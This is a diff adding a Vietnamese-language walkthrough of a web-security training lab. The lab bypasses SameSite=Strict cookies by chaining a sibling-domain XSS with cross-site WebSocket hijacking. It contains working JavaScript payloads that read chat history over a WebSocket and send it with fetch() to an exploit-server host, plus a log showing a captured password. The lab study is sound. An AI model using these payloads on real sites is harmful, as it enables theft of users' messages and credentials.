@@ -308,6 +308,74 @@ redirectOnConfirmation = (blogPath) => {
     - Nếu bạn để &submit=1 trần, trình duyệt sẽ hiểu đó là một tham số mới của request gốc (confirmation?postId=...&submit=1), không phải phần đuôi của đường dẫn sau khi “trườn” ra ngoài.
     - Encode & thành %26 để nó được truyền nguyên vẹn vào URL đích sau khi “chạy lùi”.
 
+### SameSite Strict bypass via sibling domain
+#### Study the live chat feature
+- Sử dụng chức năng **live chat** 
+- Quan sát **Proxy > HTTP history** và tìm yêu cầu bắt tay **WebSocket.** Đây phải là yêu cầu **GET /chat** gần đây nhất, không chứa bất kỳ mã thông báo không thể đoán trước nào, vì vậy có thể dễ bị tổn thương bởi CSWSH.
+- Quan sát **Proxy > WebSockets History**, ta thấy để bắt đầu, **client** gửi `READY` đến **server**, khiến máy chủ phản hồi toàn bộ cuộc trò chuyện
+
+#### Confirm the CSWSH vulnerability
+- Đến **Exploite Server**, tạo payload thực hiện kiểm thử khai thác
+```html
+    <script>
+        var ws = new WebSocket('wss://0aa3004c042e0976802a3f020009003e.web-security-academy.net/chat');
+        ws.onopen = function() {
+            ws.send("READY");
+        };
+        ws.onmessage = function(event) {
+            fetch("https://exploit-0a3c0031049f090880073e4c0119005a.exploit-server.net/exploit" + event.data);
+        };
+    </script>
+```
+- Deliver to victim
+- Đến **access log**, ta nhận được phần `event.data`
+```
+%7B%22user%22:%22CONNECTED%22,%22content%22:%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22%7D HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+```
+- Đến **Burp Decoder**, thực hiện **smart decode**
+```
+{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+```
+- Mặc dù xác nhận đã có lỗ hổng **CSWSH**, nhưng nội dung cuộc trò chuyện lấy được hoàn toàn mới của new session
+- Nguyên nhân
+    - **SameSite** nhận được là `SameSite=Strict`
+    - Script được khai thác từ trang ngoài domain
+
+=> Trình duyệt không gửi cookie từ trang ngoài domain với thuộc tính `SameSite=Strict`, đây là cơ chế bảo vệ người dùng của trình duyệt
+
+- Ý tưởng: 
+    - Khai thác dựa trên lỗi XSS của chính trang
+    - Khác thác dự trên lỗi XSS của trang khác same-site
+
+#### Exploit
+- Quan sát các response cũ trong **Proxy > HTTP history**, ta thấy được **Access-Control-Allow-Origin** header với sibling domain `https://cms-0aa3004c042e0976802a3f020009003e.web-security-academy.net`
+- Thử đăng nhập bằng username `<script>alert()</script>` và password tùy ý, ta thấy XSS xảy ra
+- Change request method và ứng dụng vẫn chấp nhận nó
+- Do là same-site nến cookie có thể gửi được từ `cms-...` đến trang chúng ta khai thác
+- Từ trang này, ta tạo payload để khởi tạo **WebSocket** tới `https://0aa3004c042e0976802a3f020009003e.web-security-academy.net`
+    - Khi khởi tạo, do cùng domain gốc nên trình duyệt sẽ gửi **Cookie** kèm theo
+    - Do có **cookie** nên `event.data` trả về có lịch sử tương ứng với **cookie** đó
+
+- Payload:
+```html
+    <script>
+        document.location = "https://cms-0afd001a038e866c80d053ab00fd0074.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0afd001a038e866c80d053ab00fd0074.web-security-academy.net%2Fchat%27%29%3Bws.onopen%20%3D%20function%28%29%20%7Bws.send%28%22READY%22%29%3B%7D%3Bws.onmessage%20%3D%20function%28event%29%20%7Bfetch%28%22https%3A%2F%2Fexploit-0a59006c039186ad80ca52df012c00a5.exploit-server.net%2Fexploit%22%20%2B%20event.data%29%3B%7D%3B%3C%2Fscript%3E&password=abc";
+    </script>
+```
+
+- Khi decode ra nó như này:
+```html
+    <script>
+        document.location = "https://cms-0afd001a038e866c80d053ab00fd0074.web-security-academy.net/login?username=<script>var ws = new WebSocket('wss://0afd001a038e866c80d053ab00fd0074.web-security-academy.net/chat');ws.onopen = function() {ws.send("READY");};ws.onmessage = function(event) {fetch("https://exploit-0a59006c039186ad80ca52df012c00a5.exploit-server.net/exploit" + event.data);};</script>&password=abc";
+    </script>
+```
+
+- Dán vào body của **Exploit Server** > Deliver to victiom
+- Truy cập **access log**, copy data thu được và decode bằng smart decode của **Burp Decoder**
+- Sử dụng thông tin đăng nhập có được từ **chat history** để đăng nhập
+```
+10.0.3.134      2025-06-06 03:47:06 +0000 "GET /exploit{"user":"Hal Pline","content":"No problem carlos, it's re7x1159ugzypdjnrfzt"} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+```
 
 ## Prevent
 ---
